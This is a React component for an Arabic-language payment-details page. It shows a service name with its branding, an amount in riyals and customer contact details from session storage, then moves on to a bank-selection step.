import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentRouterStandalone from "@/components/PaymentRouterStandalone";
import { ArrowLeft, CreditCard } from "lucide-react";

const StandalonePaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();

  return (
    <PaymentRouterStandalone>
      {(linkData) => {
        const serviceKey = linkData.service_key;
        const serviceName = linkData.service_name;
        const branding = getServiceBranding(serviceKey);
        const amount = linkData.cod_amount;
        const formattedAmount = `${amount} ر.س`;

        const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');

        const handleProceed = () => {
          navigate(`/standalone-pay/${id}/bank-selector`);
        };

        return (
          <div className="min-h-screen bg-background" dir="rtl">
            <div className="container mx-auto px-3 sm:px-4 py-8">
              <div className="max-w-2xl mx-auto">
                <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
                  <div className="flex items-center justify-between mb-6 sm:mb-8">
                    <h1 className="text-xl sm:text-3xl font-bold">تفاصيل الدفعة</h1>
                    <div
                      className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                      style={{
                        background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                      }}
                    >
                      <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                    </div>
                  </div>

                  <div className="space-y-4 sm:space-y-6 mb-6 sm:mb-8">
                    <div>
                      <Label className="text-sm text-muted-foreground">الخدمة</Label>
                      <p className="text-lg font-semibold">{serviceName}</p>
                    </div>

                    <div>
                      <Label className="text-sm text-muted-foreground">المبلغ</Label>
                      <p className="text-2xl font-bold" style={{ color: branding.colors.primary }}>{formattedAmount}</p>
                    </div>

                    <div>
                      <Label className="text-sm text-muted-foreground">الاسم</Label>
                      <p className="text-lg">{customerInfo.name || '-'}</p>
                    </div>

                    <div>
                      <Label className="text-sm text-muted-foreground">البريد الإلكتروني</Label>
                      <p className="text-lg">{customerInfo.email || '-'}</p>
                    </div>

                    <div>
                      <Label className="text-sm text-muted-foreground">رقم الهاتف</Label>
                      <p className="text-lg">{customerInfo.phone || '-'}</p>
                    </div>

                    <div>
                      <Label className="text-sm text-muted-foreground">العنوان</Label>
                      <p className="text-lg">{customerInfo.address || '-'}</p>
                    </div>
                  </div>

                  <Button
                    onClick={handleProceed}
                    size="lg"
                    className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                    style={{
                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                    }}
                  >
                    <span className="ml-2">متابعة للدفع</span>
                    <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                  </Button>
                </Card>
              </div>
            </div>
          </div>
        );
      }}
    </PaymentRouterStandalone>
  );
};

export default StandalonePaymentDetails;
